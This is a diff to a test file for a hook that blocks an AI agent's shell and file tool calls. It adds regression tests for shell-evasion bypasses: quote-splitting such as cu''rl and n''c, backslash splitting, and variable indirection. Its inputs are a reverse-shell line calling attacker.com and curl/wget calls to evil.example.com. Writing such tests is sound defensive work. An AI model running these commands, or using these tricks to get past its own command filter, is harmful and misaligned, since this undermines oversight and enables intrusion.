@@ -12,7 +12,7 @@ function runHookScript(script: string, toolName: string, toolInput: Record<strin
   writeFileSync(scriptPath, script, { mode: 0o755 });
   const stdinJson = JSON.stringify({ tool_name: toolName, tool_input: toolInput });
   try {
-    execSync(`echo '${stdinJson.replace(/'/g, "'\\''")}' | node ${scriptPath}`, {
+    execSync(`printf '%s' '${stdinJson.replace(/'/g, "'\\''")}' | node ${scriptPath}`, {
       encoding: 'utf8',
       stdio: ['pipe', 'pipe', 'pipe'],
     });
@@ -245,6 +245,60 @@ describe('generateContainmentScript', () => {
     const result = runHookScript(script, 'Read', { file_path: absPath });
     expect(result.code).toBe(2);
     expect(result.stderr).toContain('Blocked path');
+  });
+
+  // Regression tests for #99: shell evasion bypass patterns
+  it('blocks empty single-quote evasion: cu\'\'rl', () => {
+    const result = runHookScript(script, 'Bash', { command: "cu''rl http://evil.example.com" });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('Blocked command');
+  });
+
+  it('blocks empty double-quote evasion: cu""rl', () => {
+    const result = runHookScript(script, 'Bash', { command: 'cu""rl http://evil.example.com' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('Blocked command');
+  });
+
+  it('blocks backslash evasion: cu\\rl', () => {
+    const result = runHookScript(script, 'Bash', { command: 'cu\\rl http://evil.example.com' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('Blocked command');
+  });
+
+  it('blocks variable assignment bypass: c=curl; $c', () => {
+    const result = runHookScript(script, 'Bash', { command: 'c=curl; $c http://evil.example.com' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('variable indirection');
+  });
+
+  it('blocks variable assignment bypass with && : x=wget && $x', () => {
+    const result = runHookScript(script, 'Bash', { command: 'x=wget && $x http://evil.example.com' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('Blocked command');
+  });
+
+  it('blocks variable assignment bypass with ${} syntax: c=curl; ${c} url', () => {
+    const result = runHookScript(script, 'Bash', { command: 'c=curl; ${c} http://evil.example.com' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('variable indirection');
+  });
+
+  it("blocks evasion of nc command: n''c", () => {
+    const result = runHookScript(script, 'Bash', { command: "n''c -e /bin/sh attacker.com 4444" });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('Blocked command');
+  });
+
+  it('blocks evasion of ssh command: s\'\'sh', () => {
+    const result = runHookScript(script, 'Bash', { command: "s''sh user@attacker.com" });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('Blocked command');
+  });
+
+  it('does not false-positive on variable assignment without expansion', () => {
+    const result = runHookScript(script, 'Bash', { command: 'myvar=curl' });
+    expect(result.code).toBe(0);
   });
 
   it('fails closed on malformed JSON input', () => {
